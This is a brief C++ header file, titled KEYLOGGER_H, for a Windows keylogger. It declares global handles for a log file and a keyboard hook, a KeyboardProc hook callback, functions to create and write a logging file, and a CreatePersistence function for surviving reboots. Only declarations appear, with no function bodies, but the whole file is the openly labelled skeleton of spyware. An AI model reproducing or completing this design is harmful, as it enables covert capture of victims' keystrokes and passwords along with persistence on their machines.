#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <iostream>
#include <string>
#include <windows.h>
#include <strsafe.h>

#define BUFSIZE MAX_PATH

inline HANDLE loggingFile;
inline HHOOK KeyboardHook;

LRESULT WINAPI KeyboardProc(int, WPARAM, LPARAM);
HANDLE CreateNewLoggingFile(std::string);
void WriteToLoggingFile(const std::string&, const HANDLE);
void CreatePersistence(std::string);

#endif // KEYLOGGER_H
